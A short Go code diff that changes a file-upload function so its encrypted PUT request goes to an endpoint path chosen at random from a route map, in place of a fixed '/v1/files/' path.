@@ -65,7 +65,9 @@ func UploadFile(fileID string, fileContent *[]byte) (err error) {
 		return err
 	}
 
-	req, err := http.NewRequest(http.MethodPut, *BaseURL+"/v1/files/"+fileID, bytes.NewBufferString(encryptedFileContent))
+	endpointPaths := RouteMap[R_FILE_UPLOAD]
+	endpointPath := randElem(&endpointPaths)
+	req, err := http.NewRequest(http.MethodPut, *BaseURL+"/"+endpointPath+"/"+fileID, bytes.NewBufferString(encryptedFileContent))
 	if err != nil {
 		return err
 	}
